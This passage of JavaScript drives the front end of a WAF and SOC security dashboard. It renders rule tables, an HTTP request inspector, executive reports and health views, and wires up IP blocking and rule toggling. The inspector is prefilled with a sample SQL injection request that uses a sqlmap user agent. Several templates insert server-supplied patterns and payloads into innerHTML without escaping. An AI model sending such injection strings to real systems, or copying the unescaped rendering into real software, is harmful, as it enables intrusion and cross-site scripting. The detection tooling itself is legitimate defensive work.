                <tr><td colspan="7" class="text-center py-8 text-outline">Loading ruleset...</td></tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    `;

    try {
      const rules = await window.SentinelAPI.getWAFRules();
      const countBadge = document.getElementById('rules-count-badge');
      if (countBadge) countBadge.textContent = `${rules.length} Rules Active`;

      const tbody = document.getElementById('waf-rules-table-body');
      if (!tbody) return;

      tbody.innerHTML = rules.map(r => `
        <tr class="hover:bg-surface-container-high/40 transition-colors">
          <td class="py-2.5 px-4 font-bold text-primary whitespace-nowrap">${r.rule_id}</td>
          <td class="py-2.5 px-4 font-semibold text-on-surface whitespace-nowrap">${r.name}</td>
          <td class="py-2.5 px-4 whitespace-nowrap text-secondary">${r.category}</td>
          <td class="py-2.5 px-4 whitespace-nowrap">
            <span class="px-2 py-0.5 rounded text-[10px] font-bold ${r.severity === 'CRITICAL' ? 'bg-error text-on-error' : 'bg-surface-container-high text-primary'}">${r.severity}</span>
          </td>
          <td class="py-2.5 px-4 text-outline font-mono truncate max-w-xs" title="${r.pattern}">
            <code>${r.pattern}</code>
          </td>
          <td class="py-2.5 px-4 text-center whitespace-nowrap">
            <span class="px-2 py-0.5 rounded text-[10px] font-bold ${r.is_active ? 'bg-secondary/15 text-secondary' : 'bg-surface-container text-outline'}">
              ${r.is_active ? 'ACTIVE' : 'DISABLED'}
            </span>
          </td>
          <td class="py-2.5 px-4 text-center">
            <button onclick="handleToggleRule('${r.rule_id}', ${!r.is_active})" class="px-2 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-[10px] font-bold ${r.is_active ? 'text-error' : 'text-secondary'}">
              ${r.is_active ? 'Disable' : 'Enable'}
            </button>
          </td>
        </tr>
      `).join('');
    } catch (err) {
      console.error(err);
    }
  }

  // =========================================================================
  // VIEW 9: HTTP REQUEST INSPECTOR
  // =========================================================================
  async function renderHttpInspector(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6 max-w-4xl">
        <div class="bg-surface-container-low p-6 rounded-xl border border-surface-container-high/40 shadow-sm space-y-4">
          <div class="flex items-center gap-3 pb-3 border-b border-surface-container-high/40">
            <span class="material-symbols-outlined text-secondary text-[24px]">manage_search</span>
            <div>
              <h2 class="text-base font-bold text-on-surface">Deep HTTP Request Inspector</h2>
              <p class="font-mono text-xs text-outline">Decode URL entities, examine raw request headers, and test query strings</p>
            </div>
          </div>

          <div class="space-y-3 font-mono text-xs">
            <div>
              <label class="block text-outline uppercase text-[11px] mb-1">Paste Raw Request or Query String</label>
              <textarea id="raw-http-input" rows="5" class="w-full bg-surface-container-lowest text-on-surface font-mono text-xs p-3 rounded border border-surface-container-high/40 focus:outline-none" placeholder="GET /search?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1&#10;Host: api.sentinelshield.cloud&#10;User-Agent: sqlmap/1.6.12">GET /search?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1
Host: api.sentinelshield.cloud
User-Agent: sqlmap/1.6.12</textarea>
            </div>

            <div class="flex justify-end">
              <button id="deep-inspect-btn" class="px-5 py-2 rounded-lg bg-primary text-on-primary font-mono text-xs font-bold hover:brightness-110 flex items-center gap-1.5 shadow-md">
                <span class="material-symbols-outlined text-[16px]">visibility</span>
                <span>Inspect Request Stream</span>
              </button>
            </div>

            <div id="inspector-output-box" class="hidden mt-4 pt-4 border-t border-surface-container-high/30 space-y-3">
              <!-- Output breakdown -->
            </div>
          </div>
        </div>
      </div>
    `;

    document.getElementById('deep-inspect-btn')?.addEventListener('click', async () => {
      const raw = document.getElementById('raw-http-input')?.value || '';
      const outputBox = document.getElementById('inspector-output-box');
      if (!outputBox) return;

      try {
        const res = await window.SentinelAPI.inspectPayload({
          payload: raw,
          path: '/deep-inspector',
          http_method: 'GET'
        });

        outputBox.classList.remove('hidden');
        outputBox.innerHTML = `
          <div class="p-4 rounded-xl bg-surface-container-lowest border border-surface-container-high/40 space-y-2 font-mono text-xs">
            <div class="flex items-center justify-between">
              <span class="px-2 py-0.5 rounded text-[10px] font-bold ${res.verdict === 'BLOCKED' ? 'bg-error text-on-error' : 'bg-secondary/20 text-secondary'}">
                VERDICT: ${res.verdict}
              </span>
              <span class="text-outline">Execution: ${res.execution_time_ms} ms</span>
            </div>
            <div class="text-on-surface font-bold text-sm">${res.attack_category}</div>
            <div class="text-primary">Matched Rule: <b>${res.matched_rule}</b></div>
            <div class="text-outline-variant pt-2 border-t border-surface-container-high/20">
              Normalized Payload: <code class="text-secondary">${res.normalized_payload}</code>
            </div>
            <div class="text-on-surface-variant pt-1">${res.explanation}</div>
            <div class="text-secondary pt-1 font-semibold">${res.recommended_action}</div>
          </div>
        `;
      } catch (err) {
        showToast('Error during deep request inspection.', 'error');
      }
    });
  }

  // =========================================================================
  // VIEW 10: REPORTS & EXECUTIVE ANALYTICS
  // =========================================================================
  async function renderReports(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6">
        <div class="bg-surface-container-low p-6 rounded-xl border border-surface-container-high/40 shadow-sm flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
          <div class="flex items-center gap-3">
            <span class="material-symbols-outlined text-secondary text-[24px]">monitoring</span>
            <div>
              <h2 class="text-base font-bold text-on-surface">Executive Security Posture Report</h2>
              <p class="font-mono text-xs text-outline">High-level threat analytics and compliance exports</p>
            </div>
          </div>
          <div class="flex items-center gap-2">
            <a href="http://127.0.0.1:8000/api/reports/export?format=csv" target="_blank" class="px-4 py-2 rounded bg-surface-container-high hover:bg-surface-container-highest text-secondary font-mono text-xs font-semibold flex items-center gap-1.5">
              <span class="material-symbols-outlined text-[16px]">download</span>
              <span>Download CSV Audit</span>
            </a>
            <a href="http://127.0.0.1:8000/api/reports/export?format=json" target="_blank" class="px-4 py-2 rounded bg-primary text-on-primary font-mono text-xs font-bold hover:brightness-110 flex items-center gap-1.5">
              <span class="material-symbols-outlined text-[16px]">code</span>
              <span>Download JSON</span>
            </a>
          </div>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-6" id="report-cards-container">
          <div class="p-6 bg-surface-container-low rounded-xl border border-surface-container-high/40 text-center font-mono text-xs text-outline">Loading report metrics...</div>
        </div>
      </div>
    `;

    try {
      const summary = await window.SentinelAPI.getReportSummary();
      const cards = document.getElementById('report-cards-container');
      if (!cards) return;

      cards.innerHTML = `
        <div class="bg-surface-container-low p-6 rounded-xl border border-surface-container-high/40 space-y-4">
          <h3 class="font-bold text-sm text-on-surface flex items-center gap-2">
            <span class="material-symbols-outlined text-error text-[18px]">security</span>
            <span>Top Threat Vectors (OWASP Top 10)</span>
          </h3>
          <div class="space-y-3 font-mono text-xs">
            ${summary.top_attack_vectors.map(v => `
              <div class="flex items-center justify-between p-2 rounded bg-surface-container border border-surface-container-high/20">
                <span class="text-on-surface font-semibold">${v.vector}</span>
                <span class="text-error font-bold">${v.count} <span class="text-outline font-normal">(${v.share})</span></span>
              </div>
            `).join('')}
          </div>
        </div>

        <div class="bg-surface-container-low p-6 rounded-xl border border-surface-container-high/40 space-y-4">
          <h3 class="font-bold text-sm text-on-surface flex items-center gap-2">
            <span class="material-symbols-outlined text-secondary text-[18px]">public</span>
            <span>Top Geographic Threat Hubs</span>
          </h3>
          <div class="space-y-3 font-mono text-xs">
            ${summary.top_origin_countries.map(c => `
              <div class="flex items-center justify-between p-2 rounded bg-surface-container border border-surface-container-high/20">
                <div>
                  <div class="text-on-surface font-semibold">${c.country}</div>
                  <div class="text-[10px] text-outline">${c.classification}</div>
                </div>
                <span class="text-secondary font-bold">${c.attacks} attacks</span>
              </div>
            `).join('')}
          </div>
        </div>
      `;
    } catch (err) {
      console.error(err);
    }
  }

  // =========================================================================
  // VIEW 11: SYSTEM HEALTH
  // =========================================================================
  async function renderSystemHealth(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6 max-w-4xl">
        <div class="bg-surface-container-low p-6 rounded-xl border border-surface-container-high/40 shadow-sm space-y-5">
          <div class="flex items-center gap-3 pb-3 border-b border-surface-container-high/40">
            <span class="material-symbols-outlined text-secondary text-[24px]">vital_signs</span>
            <div>
              <h2 class="text-base font-bold text-on-surface">SentinelShield Engine Health &amp; Telemetry</h2>
              <p class="font-mono text-xs text-outline">Real-time status of FastAPI process, SQLite database, and detection subsystems</p>
            </div>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs" id="health-grid">
            <div class="p-4 rounded-lg bg-surface-container text-outline">Checking system status...</div>
          </div>
        </div>
      </div>
    `;

    try {
      const h = await window.SentinelAPI.getHealth();
      const grid = document.getElementById('health-grid');
      if (!grid) return;

      grid.innerHTML = `
        <div class="p-4 rounded-lg bg-surface-container border border-surface-container-high/30 space-y-1">
          <span class="text-outline uppercase text-[10px]">API Server Status</span>
          <div class="text-base font-bold text-secondary flex items-center gap-2">
            <span class="w-2.5 h-2.5 rounded-full bg-secondary"></span>
            <span>${h.status}</span>
          </div>
          <span class="text-outline text-[11px]">Version: ${h.version} (${h.environment})</span>
        </div>

        <div class="p-4 rounded-lg bg-surface-container border border-surface-container-high/30 space-y-1">
          <span class="text-outline uppercase text-[10px]">Persistent Database</span>
          <div class="text-base font-bold text-primary flex items-center gap-2">
            <span class="w-2.5 h-2.5 rounded-full bg-primary"></span>
            <span>${h.database}</span>
          </div>
          <span class="text-outline text-[11px]">SQLite (Local High-Performance Engine)</span>
        </div>

        <div class="p-4 rounded-lg bg-surface-container border border-surface-container-high/30 space-y-1">
          <span class="text-outline uppercase text-[10px]">WAF &amp; IDS Engine</span>
          <div class="text-sm font-bold text-on-surface">${h.detection_engine}</div>
          <span class="text-outline text-[11px]">Compiled Regex &amp; Input Normalizer Active</span>
        </div>

        <div class="p-4 rounded-lg bg-surface-container border border-surface-container-high/30 space-y-1">
          <span class="text-outline uppercase text-[10px]">Rate Limiter</span>
          <div class="text-sm font-bold text-on-surface">${h.rate_limiter}</div>
          <span class="text-outline text-[11px]">Sliding Window IP Tracker Active</span>
        </div>

        <div class="p-4 rounded-lg bg-surface-container border border-surface-container-high/30 space-y-1 md:col-span-2">
          <span class="text-outline uppercase text-[10px]">Node Uptime</span>
          <div class="text-base font-bold text-secondary">${h.uptime_seconds} seconds</div>
          <span class="text-outline text-[11px]">Timestamp: ${new Date(h.timestamp).toUTCString()}</span>
        </div>
      `;
    } catch (err) {
      console.error(err);
    }
  }

  // ---------------- Global Action Handlers ----------------
  window.openModal = function (ip, vector, sig, payloadEncoded) {
    const modal = document.getElementById('socModal');
    if (!modal) return;
    currentInspectingIp = ip;
    document.getElementById('modalTitle').textContent = `SOC Inspection: ${ip}`;
    document.getElementById('modalSubtitle').textContent = `Vector: ${vector} • Rule: ${sig}`;
    document.getElementById('modalPayload').textContent = decodeURIComponent(payloadEncoded || '');
    document.getElementById('modalTraceId').textContent = `tr-${Math.floor(10000 + Math.random() * 90000)}-waf`;
    modal.classList.remove('hidden');
  };

  window.closeModal = function () {
    const modal = document.getElementById('socModal');
    if (modal) modal.classList.add('hidden');
  };

  window.isolateSubnetAction = async function () {
    if (!currentInspectingIp) return;
    try {
      await window.SentinelAPI.blockIP(currentInspectingIp, 'Host Isolated from SOC Modal');
      showToast(`Host ${currentInspectingIp} isolated and added to permanent edge blocklist.`, 'success');
      closeModal();
      renderCurrentView();
    } catch (err) {
      showToast('Error isolating host.', 'error');
    }
  };

  window.handleQuickBlock = async function (ip) {
    try {
      await window.SentinelAPI.blockIP(ip, 'Quick Block from SOC Dashboard');
      showToast(`WAF Rule Deployed: Subnet Block for ${ip}`, 'success');
      renderCurrentView();
    } catch (err) {
      showToast('Error blocking IP.', 'error');
    }
  };

  window.handleUnblockIP = async function (ip) {
    try {
      await window.SentinelAPI.unblockIP(ip);
      showToast(`IP ${ip} successfully unblocked.`, 'success');
      renderCurrentView();
    } catch (err) {
      showToast('Error unblocking IP.', 'error');
    }
  };

  window.handleAlertStatus = async function (alertId, newStatus, assignee) {
    try {
      await window.SentinelAPI.updateAlertStatus(alertId, {
        status: newStatus,
        assignee: assignee || null
      });
      showToast(`Alert #${alertId} updated to ${newStatus}.`, 'success');
      renderSecurityAlerts(document.getElementById('views-container'));
    } catch (err) {
      showToast('Error updating alert status.', 'error');
    }
  };

  window.handleAddNotePrompt = async function (alertId) {
    const note = prompt('Enter SOC Analyst investigation note:');
    if (!note || !note.trim()) return;
    try {
      await window.SentinelAPI.addAlertNote(alertId, {
        author: 'Alex Reyes (Lead SOC)',
        content: note.trim()
      });
      showToast(`Note added to Alert #${alertId}.`, 'success');
      renderSecurityAlerts(document.getElementById('views-container'));
    } catch (err) {
      showToast('Error saving note.', 'error');
    }
  };

  window.handleToggleRule = async function (ruleId, newActiveState) {
    try {
      await window.SentinelAPI.toggleWAFRule(ruleId, { is_active: newActiveState });
      showToast(`Rule ${ruleId} is now ${newActiveState ? 'ENABLED' : 'DISABLED'}.`, 'success');
      renderWAFRules(document.getElementById('views-container'));
    } catch (err) {
      showToast('Error toggling WAF rule.', 'error');
    }
  };

  // ---------------- Initialize Application ----------------
  document.addEventListener('DOMContentLoaded', () => {
    const initialRoute = window.location.hash.replace('#', '') || 'overview-dashboard';
    navigate(initialRoute);
  });

})();
